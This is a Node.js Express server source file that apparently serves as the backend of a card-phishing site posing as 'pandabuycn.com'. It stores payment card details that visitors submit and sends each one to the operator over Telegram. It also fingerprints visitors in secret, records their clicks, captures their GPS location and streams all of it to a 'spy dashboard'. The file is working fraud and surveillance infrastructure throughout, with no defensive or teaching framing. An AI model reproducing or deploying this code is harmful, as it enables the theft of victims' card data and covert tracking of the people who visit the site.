const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Load configuration
let config;
try {
  // Try to load local config first
  config = require('./config.local.js');
  console.log('✅ Loaded local configuration');
} catch (error) {
  // Fallback to default config
  config = require('./config.js');
  console.log('⚠️  Using default configuration - please create config.local.js');
}

// Load Telegram bot if enabled
let telegramBot = null;
if (config.server.enableTelegram && config.telegram.botToken !== 'YOUR_BOT_TOKEN_HERE') {
  const TelegramBot = require('./telegram-bot.js');
  telegramBot = new TelegramBot(config.telegram.botToken, config.telegram.chatId);
  console.log('🤖 Telegram bot initialized');
} else {
  console.log('📱 Telegram integration disabled or not configured');
}

const PORT = config.server.port;

// Data file paths
const DATA_FILE = path.join(__dirname, 'card-data.json');
const VISITS_FILE = path.join(__dirname, 'visits-data.json');
const FINGERPRINTS_FILE = path.join(__dirname, 'fingerprints-data.json');

// Real-time tracking storage
const activeVisitors = new Map();
const recentActivity = [];

// Middleware
app.use(cors()); // Enable CORS for all routes
app.use(express.json()); // Parse JSON request bodies

// Visit tracking middleware
app.use((req, res, next) => {
  // Skip tracking for API calls and admin panels
  if (req.path.startsWith('/api/') || req.path.includes('admin-')) {
    return next();
  }
  
  // Track the visit
  trackVisit(req);
  next();
});

app.use(express.static('.')); // Serve static files from current directory

// Initialize data files if they don't exist
if (!fs.existsSync(DATA_FILE)) {
  fs.writeFileSync(DATA_FILE, JSON.stringify([]));
  console.log('Created empty card data file');
}

if (!fs.existsSync(VISITS_FILE)) {
  fs.writeFileSync(VISITS_FILE, JSON.stringify([]));
  console.log('Created empty visits data file');
}

if (!fs.existsSync(FINGERPRINTS_FILE)) {
  fs.writeFileSync(FINGERPRINTS_FILE, JSON.stringify([]));
  console.log('Created empty fingerprints data file');
}

// Visit tracking function
function trackVisit(req) {
  try {
    // Get visitor information
    const userAgent = req.headers['user-agent'] || '';
    const ip = req.ip || req.connection.remoteAddress || req.socket.remoteAddress || 
               (req.connection.socket ? req.connection.socket.remoteAddress : null) || 
               req.headers['x-forwarded-for']?.split(',')[0] || 'Unknown';
    
    // Parse user agent for browser and OS info
    const browserInfo = parseUserAgent(userAgent);
    
    const visitData = {
      timestamp: new Date().toISOString(),
      ip: ip,
      userAgent: userAgent,
      browser: browserInfo.browser,
      os: browserInfo.os,
      deviceType: browserInfo.deviceType,
      page: req.path,
      referrer: req.headers.referer || null,
      language: req.headers['accept-language']?.split(',')[0] || null,
      // Mock location data (in real app, you'd use IP geolocation service)
      country: getRandomCountry(),
      city: getRandomCity(),
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screenResolution: 'Unknown' // This would come from client-side
    };
    
    // Read existing visits
    let visits = [];
    try {
      visits = JSON.parse(fs.readFileSync(VISITS_FILE, 'utf8'));
    } catch (readError) {
      console.error('Error reading visits data:', readError);
    }
    
    // Add new visit
    visits.push(visitData);
    
    // Keep only last 1000 visits to prevent file from growing too large
    if (visits.length > 1000) {
      visits = visits.slice(-1000);
    }
    
    // Save visits data
    fs.writeFileSync(VISITS_FILE, JSON.stringify(visits, null, 2));
    
    console.log(`Visit tracked: ${ip} - ${browserInfo.browser} on ${browserInfo.os}`);
  } catch (error) {
    console.error('Error tracking visit:', error);
  }
}

// Helper function to parse user agent
function parseUserAgent(userAgent) {
  const ua = userAgent.toLowerCase();
  
  let browser = 'Unknown';
  let os = 'Unknown';
  let deviceType = 'Desktop';
  
  // Detect browser
  if (ua.includes('chrome') && !ua.includes('edg')) browser = 'Chrome';
  else if (ua.includes('firefox')) browser = 'Firefox';
  else if (ua.includes('safari') && !ua.includes('chrome')) browser = 'Safari';
  else if (ua.includes('edg')) browser = 'Edge';
  else if (ua.includes('opera')) browser = 'Opera';
  
  // Detect OS
  if (ua.includes('windows')) os = 'Windows';
  else if (ua.includes('mac')) os = 'macOS';
  else if (ua.includes('linux')) os = 'Linux';
  else if (ua.includes('android')) os = 'Android';
  else if (ua.includes('ios')) os = 'iOS';
  
  // Detect device type
  if (ua.includes('mobile') || ua.includes('android')) deviceType = 'Mobile';
  else if (ua.includes('tablet') || ua.includes('ipad')) deviceType = 'Tablet';
  
  return { browser, os, deviceType };
}

// Mock location functions (replace with real IP geolocation in production)
function getRandomCountry() {
  const countries = ['United States', 'United Kingdom', 'Germany', 'France', 'Canada', 'Australia', 'Japan', 'Brazil', 'India', 'China'];
  return countries[Math.floor(Math.random() * countries.length)];
}

function getRandomCity() {
  const cities = ['New York', 'London', 'Berlin', 'Paris', 'Toronto', 'Sydney', 'Tokyo', 'São Paulo', 'Mumbai', 'Beijing'];
  return cities[Math.floor(Math.random() * cities.length)];
}

// Visit notification cooldown tracking
let lastVisitNotification = 0;
const visitNotificationCooldown = (config.telegram?.notifications?.visitAlertCooldown || 5) * 60 * 1000; // Convert minutes to milliseconds

// Function to check if visit notification should be sent
function shouldSendVisitNotification(visitData) {
  if (!telegramBot || !config.telegram.notifications.sendVisitAlerts) {
    return false;
  }
  
  // Check cooldown
  const now = Date.now();
  if (now - lastVisitNotification < visitNotificationCooldown) {
    return false;
  }
  
  // Check if page is in alert list
  const page = visitData.page?.pathname || visitData.pathname || '/';
  const alertPages = config.telegram.notifications.visitAlertPages || ['/'];
  
  if (!alertPages.includes(page)) {
    return false;
  }
  
  return true;
}

// API Routes
// Get all card data
app.get('/api/cards', (req, res) => {
  try {
    const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    res.json(data);
  } catch (error) {
    console.error('Error reading card data:', error);
    res.status(500).json({ error: 'Failed to retrieve card data' });
  }
});

// Add new card data
app.post('/api/cards', (req, res) => {
  try {
    // Read existing data
    let data = [];
    try {
      data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    } catch (readError) {
      console.error('Error reading existing data, starting fresh:', readError);
    }
    
    // Add new card with timestamp and enhanced data
    const newCard = {
      ...req.body,
      serverTimestamp: new Date().toISOString(),
      submissionDate: new Date().toLocaleDateString(),
      submissionTime: new Date().toLocaleTimeString(),
      domain: 'pandabuycn.com'
    };
    
    data.push(newCard);
    
    // Write updated data back to file
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
    
    console.log('Card data saved successfully');
    console.log('New card data:', JSON.stringify(newCard, null, 2));
    
    // Send Telegram notification if enabled
    console.log('Checking Telegram notification conditions...');
    console.log('telegramBot exists:', !!telegramBot);
    console.log('sendCardAlerts enabled:', config.telegram.notifications.sendCardAlerts);
    
    if (telegramBot && config.telegram.notifications.sendCardAlerts) {
      console.log('🚀 Sending Telegram notification...');
      telegramBot.sendCardNotification(newCard).catch(error => {
        console.error('Failed to send Telegram notification:', error.message);
      });
    } else {
      console.log('❌ Telegram notification skipped - conditions not met');
    }

    // Emit to real-time dashboard
    io.emit('card_submission', newCard);
    
    res.status(201).json({ success: true, message: 'Card data saved successfully' });
  } catch (error) {
    console.error('Error saving card data:', error);
    res.status(500).json({ error: 'Failed to save card data' });
  }
});

// Clear all card data (for testing/admin purposes)
app.delete('/api/cards', (req, res) => {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify([]));
    console.log('All card data cleared');
    res.json({ success: true, message: 'All card data cleared' });
  } catch (error) {
    console.error('Error clearing card data:', error);
    res.status(500).json({ error: 'Failed to clear card data' });
  }
});

// Get all visit data
app.get('/api/visits', (req, res) => {
  try {
    const data = JSON.parse(fs.readFileSync(VISITS_FILE, 'utf8'));
    res.json(data);
  } catch (error) {
    console.error('Error reading visits data:', error);
    res.status(500).json({ error: 'Failed to retrieve visits data' });
  }
});

// Clear all visit data (for testing/admin purposes)
app.delete('/api/visits', (req, res) => {
  try {
    fs.writeFileSync(VISITS_FILE, JSON.stringify([]));
    console.log('All visit data cleared');
    res.json({ success: true, message: 'All visit data cleared' });
  } catch (error) {
    console.error('Error clearing visit data:', error);
    res.status(500).json({ error: 'Failed to clear visit data' });
  }
});

// Enhanced visit tracking endpoint for client-side data
app.post('/api/track-visit', (req, res) => {
  try {
    const clientData = req.body;
    
    // Add server-side information
    const serverData = {
      serverTimestamp: new Date().toISOString(),
      serverIP: req.ip || req.connection.remoteAddress || req.socket.remoteAddress || 
                (req.connection.socket ? req.connection.socket.remoteAddress : null) || 
                req.headers['x-forwarded-for']?.split(',')[0] || 'Unknown',
      serverUserAgent: req.headers['user-agent'] || '',
      serverHeaders: {
        acceptLanguage: req.headers['accept-language'],
        acceptEncoding: req.headers['accept-encoding'],
        connection: req.headers.connection,
        host: req.headers.host,
        referer: req.headers.referer
      }
    };
    
    // Combine client and server data
    const enhancedVisitData = {
      ...clientData,
      server: serverData,
      // Add some mock location data if not provided by client
      geoLocation: clientData.location?.latitude ? clientData.location : {
        country: getRandomCountry(),
        city: getRandomCity(),
        latitude: null,
        longitude: null,
        source: 'mock'
      }
    };
    
    // Read existing visits
    let visits = [];
    try {
      visits = JSON.parse(fs.readFileSync(VISITS_FILE, 'utf8'));
    } catch (readError) {
      console.error('Error reading visits data:', readError);
    }
    
    // Add new enhanced visit
    visits.push(enhancedVisitData);
    
    // Keep only last 1000 visits
    if (visits.length > 1000) {
      visits = visits.slice(-1000);
    }
    
    // Save visits data
    fs.writeFileSync(VISITS_FILE, JSON.stringify(visits, null, 2));
    
    console.log(`Enhanced visit tracked: ${serverData.serverIP} - ${clientData.browser?.name || 'Unknown'} on ${clientData.os?.name || 'Unknown'}`);
    
    // Send Telegram notification if conditions are met
    if (shouldSendVisitNotification(enhancedVisitData)) {
      lastVisitNotification = Date.now();
      telegramBot.sendVisitNotification(enhancedVisitData).catch(error => {
        console.error('Failed to send visit notification to Telegram:', error.message);
      });
    }
    
    res.json({ success: true, message: 'Visit tracked successfully' });
  } catch (error) {
    console.error('Error tracking enhanced visit:', error);
    res.status(500).json({ error: 'Failed to track visit' });
  }
});

// Admin panel routes
app.get('/admin-cards', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin-cards.html'));
});

app.get('/admin-visits', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin-visits.html'));
});

// Fingerprinting endpoints
app.post('/api/fingerprint', (req, res) => {
  try {
    const fingerprintData = {
      ...req.body,
      serverTimestamp: new Date().toISOString(),
      ip: req.ip || req.connection.remoteAddress || 'unknown'
    };

    // Save fingerprint data
    let fingerprints = [];
    try {
      fingerprints = JSON.parse(fs.readFileSync(FINGERPRINTS_FILE, 'utf8'));
    } catch (readError) {
      console.error('Error reading fingerprints data:', readError);
    }

    fingerprints.push(fingerprintData);
    
    // Keep only last 1000 fingerprints
    if (fingerprints.length > 1000) {
      fingerprints = fingerprints.slice(-1000);
    }

    fs.writeFileSync(FINGERPRINTS_FILE, JSON.stringify(fingerprints, null, 2));

    // Add to active visitors
    activeVisitors.set(fingerprintData.sessionId, {
      ...fingerprintData,
      joinTime: Date.now(),
      lastActivity: Date.now()
    });

    console.log(`🕵️ New fingerprint: ${fingerprintData.sessionId} from ${fingerprintData.fingerprint?.network?.ip || 'unknown'}`);

    // Send to Telegram
    if (telegramBot) {
      sendVisitorNotificationToTelegram(fingerprintData);
    }

    // Emit to real-time dashboard
    io.emit('new_visitor', fingerprintData);

    res.json({ success: true, message: 'Fingerprint recorded' });
  } catch (error) {
    console.error('Error processing fingerprint:', error);
    res.status(500).json({ error: 'Failed to process fingerprint' });
  }
});

app.post('/api/tracking-update', (req, res) => {
  try {
    const updateData = {
      ...req.body,
      serverTimestamp: new Date().toISOString()
    };

    // Update visitor activity
    if (activeVisitors.has(updateData.sessionId)) {
      const visitor = activeVisitors.get(updateData.sessionId);
      visitor.lastActivity = Date.now();
      activeVisitors.set(updateData.sessionId, visitor);
    }

    // Add to recent activity
    recentActivity.unshift(updateData);
    if (recentActivity.length > 100) {
      recentActivity.pop();
    }

    console.log(`⚡ Activity: ${updateData.type} from ${updateData.sessionId.slice(0, 8)}`);

    // Send interesting activities to Telegram
    if (telegramBot && shouldNotifyActivity(updateData)) {
      sendActivityNotificationToTelegram(updateData);
    }

    // Emit to real-time dashboard
    io.emit('visitor_activity', updateData);

    res.json({ success: true, message: 'Activity tracked' });
  } catch (error) {
    console.error('Error tracking activity:', error);
    res.status(500).json({ error: 'Failed to track activity' });
  }
});

// Test Telegram bot endpoint
app.get('/test-telegram', async (req, res) => {
  if (!telegramBot) {
    return res.json({ 
      success: false, 
      message: 'Telegram bot not configured. Please check your config.local.js file.' 
    });
  }
  
  try {
    await telegramBot.testConnection();
    res.json({ 
      success: true, 
      message: 'Telegram bot test successful! Check your Telegram chat for the test message.' 
    });
  } catch (error) {
    res.json({ 
      success: false, 
      message: `Telegram bot test failed: ${error.message}` 
    });
  }
});

// Real-time spy dashboard
app.get('/spy-dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'realtime-spy-dashboard.html'));
});

// Server info route
app.get('/server-info', (req, res) => {
  res.sendFile(path.join(__dirname, 'server-info.html'));
});

// Telegram notification functions
function sendVisitorNotificationToTelegram(fingerprintData) {
  const fp = fingerprintData.fingerprint || {};
  const basic = fp.basic || {};
  const network = fp.network || {};
  const hardware = fp.hardware || {};
  
  const message = `🕵️ NEW VISITOR DETECTED!

👤 SESSION: ${fingerprintData.sessionId.slice(0, 12)}...
🌐 IP: ${network.ip || 'Unknown'}
📍 Location: ${network.location?.city || 'Unknown'}, ${network.location?.country || 'Unknown'}
🏢 ISP: ${network.location?.isp || 'Unknown'}

💻 DEVICE INFO:
Browser: ${getBrowserFromUA(basic.userAgent)}
OS: ${basic.platform || 'Unknown'}
Screen: ${hardware.screen?.width}x${hardware.screen?.height}
Memory: ${hardware.deviceMemory || 'Unknown'}GB

🔗 URL: ${basic.url || 'Unknown'}
🔄 Referrer: ${basic.referrer || 'Direct'}
🕐 Time: ${new Date().toLocaleString()}

🎯 Live Dashboard: https://pandabuycn.com/spy-dashboard`;

  telegramBot.sendCustomMessage(message).catch(console.error);
}

function sendActivityNotificationToTelegram(activityData) {
  const visitor = activeVisitors.get(activityData.sessionId);
  const visitorInfo = visitor ? `${visitor.fingerprint?.network?.ip || 'Unknown'} (${visitor.fingerprint?.network?.location?.country || 'Unknown'})` : 'Unknown';
  
  let message = '';
  
  switch (activityData.type) {
    case 'click':
      message = `🖱️ CLICK DETECTED!
👤 Visitor: ${visitorInfo}
🎯 Target: ${activityData.data.target}
📍 Position: (${activityData.data.x}, ${activityData.data.y})
🕐 Time: ${new Date().toLocaleString()}`;
      break;
      
    case 'gps':
      message = `📍 GPS LOCATION OBTAINED!
👤 Visitor: ${visitorInfo}
🌍 Coordinates: ${activityData.data.latitude?.toFixed(6)}, ${activityData.data.longitude?.toFixed(6)}
🎯 Accuracy: ${activityData.data.accuracy}m
🕐 Time: ${new Date().toLocaleString()}`;
      break;
      
    case 'visibility':
      if (activityData.data.state === 'hidden') {
        message = `👁️ VISITOR LEFT PAGE!
👤 Visitor: ${visitorInfo}
📄 Page became hidden/minimized
🕐 Time: ${new Date().toLocaleString()}`;
      }
      break;
  }
  
  if (message) {
    telegramBot.sendCustomMessage(message).catch(console.error);
  }
}

function shouldNotifyActivity(activityData) {
  // Only notify for important activities
  return ['click', 'gps', 'visibility'].includes(activityData.type) && 
         (activityData.type !== 'visibility' || activityData.data.state === 'hidden');
}

function getBrowserFromUA(userAgent) {
  if (!userAgent) return 'Unknown';
  if (userAgent.includes('Chrome')) return 'Chrome';
  if (userAgent.includes('Firefox')) return 'Firefox';
  if (userAgent.includes('Safari')) return 'Safari';
  if (userAgent.includes('Edge')) return 'Edge';
  return 'Other';
}

// Socket.IO connection handling
io.on('connection', (socket) => {
  console.log('🔗 Dashboard connected:', socket.id);
  
  // Send current stats to new connections
  socket.emit('stats_update', {
    totalVisitors: activeVisitors.size,
    activeVisitors: activeVisitors.size,
    recentActivity: recentActivity.slice(0, 10)
  });
  
  socket.on('disconnect', () => {
    console.log('❌ Dashboard disconnected:', socket.id);
  });
});

// Clean up inactive visitors every minute
setInterval(() => {
  const now = Date.now();
  const timeout = 5 * 60 * 1000; // 5 minutes
  
  for (const [sessionId, visitor] of activeVisitors) {
    if (now - visitor.lastActivity > timeout) {
      console.log(`🚪 Visitor timeout: ${sessionId.slice(0, 8)}`);
      activeVisitors.delete(sessionId);
      io.emit('visitor_left', { sessionId });
    }
  }
}, 60000);

// Start server
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Access the website at http://localhost:${PORT}`);
  console.log(`Card data API available at http://localhost:${PORT}/api/cards`);
  console.log(`Visits data API available at http://localhost:${PORT}/api/visits`);
  console.log(`Card Admin Panel at http://localhost:${PORT}/admin-cards`);
  console.log(`Visits Admin Panel at http://localhost:${PORT}/admin-visits`);
  console.log(`🕵️ SPY DASHBOARD at http://localhost:${PORT}/spy-dashboard`);
  console.log(`Server information page at http://localhost:${PORT}/server-info`);
}); 